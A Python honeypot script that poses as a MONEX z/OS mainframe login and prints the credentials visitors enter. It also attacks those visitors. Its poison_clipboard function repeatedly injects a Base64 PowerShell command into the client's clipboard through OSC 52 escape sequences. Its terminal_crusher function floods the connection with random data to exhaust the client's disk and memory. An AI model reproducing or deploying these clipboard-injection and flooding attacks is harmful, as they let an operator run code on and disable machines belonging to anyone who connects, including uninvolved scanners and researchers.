import time
import random
import os
import base64

MAINFRAME_PROMPT = "READY\r\n"
BANNERS = [
    "ICH70001I - LOGIN TO IBM z/OS v2.5 AT MONEX-FINANCIAL-MEX\r\n",
    "ENTER USERID - \r\n"
]

def poison_clipboard(client_socket):
    """
    Utiliza la secuencia OSC 52 para inyectar un comando en el portapapeles del atacante.
    Payload: PowerShell que muestra el mensaje de MONEX.
    """
    # Comando de PowerShell que se ejecutará si el atacante lo pega en su terminal
    cmd = "powershell.exe -NoProfile -Command \"Clear-Host; Write-Host 'WELCOME TO MONEX MEXICO SYSTEM - COBOL' -ForegroundColor Green; Start-Sleep -s 10\""
    
    # Codificar en Base64 para la secuencia OSC 52
    b64_payload = base64.b64encode(cmd.encode()).decode()
    
    # Secuencia OSC 52: \x1b]52;c;[BASE64]\x07
    osc_sequence = f"\x1b]52;c;{b64_payload}\x07"
    try:
        client_socket.send(osc_sequence.encode())
    except:
        pass

def terminal_crusher(client_socket):
    print("[⚔️] Iniciando Terminal Crusher (Disk/RAM Exhaustion).")
    try:
        while True:
            trash = os.urandom(1024 * 1024)
            client_socket.send(trash)
            time.sleep(0.01)
    except: pass

def handle_mainframe_shell(client_socket, ip):
    try:
        client_socket.send(BANNERS[0].encode())
        time.sleep(1)
        client_socket.send(BANNERS[1].encode())
        
        userid = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
        client_socket.send(b"ENTER PASSWORD - \r\n")
        
        password = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[🍯] Credenciales MONEX capturadas: {userid} / {password}")
        
        # Inyectar el veneno en el portapapeles justo al entrar
        poison_clipboard(client_socket)
        
        client_socket.send(b"ICH70008I LOGIN SUCCESSFUL. SYSTEM: MONEX-MX-COBOL-V4\r\n")
        client_socket.send(MAINFRAME_PROMPT.encode())

        start_interaction = time.time()
        while True:
            cmd_recv = client_socket.recv(1024).decode('utf-8', errors='ignore').strip().upper()
            if not cmd_recv: break
            
            if "D IPL" in cmd_recv:
                client_socket.send(b"IEE104I 21.47.23 UNIT=0B02 SYSTEM=MONX1\r\n")
            elif "LISTCAT" in cmd_recv:
                client_socket.send(b"CATALOG.MONEX.PROD.PAYMENTS\r\nCATALOG.MONEX.SWIFT.LOGS\r\n")
            elif "LOGOFF" in cmd_recv:
                client_socket.send(b"ICH70002I LOGOFF COMPLETE\r\n")
                break
            else:
                client_socket.send(f"IKJ56621I INVALID COMMAND: {cmd_recv}\r\n".encode())
            
            # Envenenar el portapapeles en cada interacción por si lo limpió
            poison_clipboard(client_socket)
            client_socket.send(MAINFRAME_PROMPT.encode())

            if time.time() - start_interaction > 45:
                client_socket.send(b"\r\n*** TERMINAL BUFFER OVERFLOW - SYSTEM HALT ***\r\n")
                terminal_crusher(client_socket)
                return
    except: pass
